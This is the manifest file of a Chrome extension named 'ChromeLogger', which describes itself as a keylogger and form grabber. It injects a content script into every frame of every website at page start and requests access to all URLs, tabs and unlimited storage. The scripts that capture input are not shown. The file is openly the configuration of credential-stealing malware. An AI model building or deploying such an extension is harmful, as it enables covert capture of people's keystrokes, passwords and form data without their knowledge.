{
  "name": "ChromeLogger",
  "version": "1.0",
  "manifest_version": 2,
  "description": "A keylogger and form grabber for Google Chrome.",
  "options_page": "src/options/index.html",
  "background": {
    "scripts": ["src/background/background.js", "src/inject/inject.js"]
  },
  "content_scripts": [ 
    {
      "all_frames": true,
      "matches": ["*://*/*"],
      "js": ["src/content/content.js"],
      "run_at": "document_start"
    }
  ],
  "permissions": [
    "<all_urls>",
    "tabs",
    "storage",
    "unlimitedStorage"
  ]
}